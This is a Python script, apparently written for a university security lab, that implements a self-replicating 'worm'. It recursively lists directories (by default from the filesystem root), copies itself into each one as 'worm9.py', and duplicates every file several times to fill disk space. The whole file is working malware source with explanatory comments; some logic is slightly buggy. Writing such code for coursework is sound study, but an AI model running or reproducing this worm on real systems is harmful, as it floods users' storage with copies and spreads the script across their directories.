from os import mkdir

# used to list all files and directories
import os
# used to copy file contents
import shutil

# a worm is a type of malware which replicate itself and create other files
# to consume spaces in our hard drives. 
# Different from typical virus is that virus only infects files
# and worms replicates files and keep the duplicates out of sight

class Worm:
    
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            # defines where to start looking for directories root is "/""
            self.path = "/"
        else:
            self.path = path
            
        if isinstance(target_dir_list, type(None)):
            # target_dir_list pass a list of initial target directories
            # by default an empty list []
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list
            
        if isinstance(target_dir_list, type(None)):
            # iterations defines how many instances the worm will create
            # for each existing file
            # if we want more replicates files we can increase iterations
            self.iteration = 4
        else:
            self.iteration = iteration
        
        # get own absolute path
        self.own_path = os.path.realpath(__file__)
        
    # list all the target directories we want to copy our worm and 
    # existing files in the directories
    def list_directories(self,path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)
        
        for file in files_in_current_directory:
            # avoid hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
    
    # Method to Replicate the Worm
    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, "worm9.py")
            # copy the script in the new directory with similar name
            shutil.copyfile(self.own_path, destination)
            
    # Method to copy existing files
    # duplicate files the number of times as the iteration argument 
    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        if i == 0: 
                            destination = os.path.join(directory,('worm'+str(i)+'.pdf'))
                            shutil.copyfile(source, destination)
                        if i == 1:
                            destination = os.path.join(directory,('worm'+str(i)+'.txt'))
                            shutil.copyfile(source, destination)
                        elif i > 1:
                            destination = os.path.join(directory,('worm'+str(i)+'.py'))
                            shutil.copyfile(source, destination)
                        
    # Method to integrate everything                   
    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()
        self.copy_existing_files()
        
        
                        
if __name__=="__main__":
    # current_directory --> in which directory to create files
    
    folder_directory = os.path.abspath("C:\MT5\TNM031\lab4\lab4-worm\hidden")
    current_directory = os.path.abspath("C:\MT5\TNM031\lab4\lab4-worm") # os.mkdir("C:\MT5\TNM031\lab4\lab4-worm")
    worm = Worm(path=current_directory)
    worm1 = Worm(path=folder_directory)
    worm.start_worm_actions()
    worm1.start_worm_actions()